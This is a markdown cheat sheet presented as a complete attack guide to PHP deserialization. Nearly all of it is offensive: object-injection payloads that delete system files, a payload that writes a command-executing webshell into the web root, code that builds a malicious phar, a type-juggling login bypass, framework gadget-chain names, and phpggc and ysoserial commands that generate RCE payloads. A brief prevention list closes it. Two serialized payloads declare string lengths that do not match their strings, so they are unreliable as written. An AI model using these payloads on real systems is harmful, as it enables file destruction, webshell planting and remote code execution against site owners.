# PHP Deserialization — Complete Attack Guide

## 1. Detection

### Magic Methods
```php
__construct()     // Object creation
__destruct()      // Object destruction
__wakeup()        // unserialize() called
__toString()      // Object to string
__call()          // Method not found
__get()           // Property not found
__set()           // Property assignment
```

### Finding Deserialization Points
```
search for: unserialize( in source code
search for: __wakeup, __destruct, __toString in classes
cookies containing: O:4:"User":...
POST data containing: O:4:"User":...
```

## 2. Exploitation

### 2.1 Object Injection
```php
// Vulnerable class
class FileHandler {
    public $filename;
    public function __destruct() {
        unlink($this->filename); // Dangerous!
    }
}

// Exploit: O:11:"FileHandler":1:{s:8:"filename";s:15:"/etc/passwd";}
```

### 2.2 Magic Method Chain
```php
class Logger {
    public $logFile;
    public $content;
    public function __destruct() {
        file_put_contents($this->logFile, $this->content);
    }
}

// Exploit: Write webshell
// O:6:"Logger":2:{s:7:"logFile";s:18:"/var/www/shell.php";s:7:"content";s:31:"<?php system($_GET['cmd']);?>";}
```

### 2.3 Phar Deserialization
```php
// Phar files trigger deserialization when accessed
// Create malicious phar:
$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new FileHandler();
$o->filename = "/etc/passwd";
$phar->setMetadata($o); // Serialized object stored here
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

// Trigger via: phar://evil.phar/test.txt
```

### 2.4 Type Juggling
```php
// PHP loose comparison
"0e123" == "0e456"  // true (both treated as 0)
"0" == false        // true
"" == false         // true
null == false       // true

// Exploit: bypass authentication
// password hash: 0e123456789
// input: 0e999999999 → both are "0" in scientific notation
```

## 3. Gadget Chains

### 3.1 ThinkPHP
```
O:25:"think\process\pipes\Windows":1:{...}
O:25:"think\process\pipes\Linux":1:{...}
```

### 3.2 Laravel
```
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{...}
O:39:"Illuminate\Bus\Dispatcher":3:{...}
```

### 3.3 WordPress
```
O:25:"Requests_Utility_FilteredIterator":2:{...}
```

### 3.4 Yii2
```
O:23:"yii\rest\CreateAction":2:{...}
```

## 4. Tools

### phpggc (PHP Generic Gadget Chains)
```bash
# List gadget chains
phpggc -l

# Generate payload
phpggc Laravel/RCE1 system 'id'
phpggc ThinkPHP/RCE1 system 'id'

# Save to file
phpggc Laravel/RCE1 system 'id' -o payload.ser
```

### ysoserial (Java)
```bash
java -jar ysoserial.jar CommonsCollections1 'id'
```

## 5. Prevention

1. **Don't use unserialize() on user input** — Use JSON instead
2. **Implement __wakeup() validation** — Check object integrity
3. **Use allowed_classes parameter** — `unserialize($data, ['allowed_classes' => ['SafeClass']])`
4. **Sign serialized data** — HMAC to prevent tampering
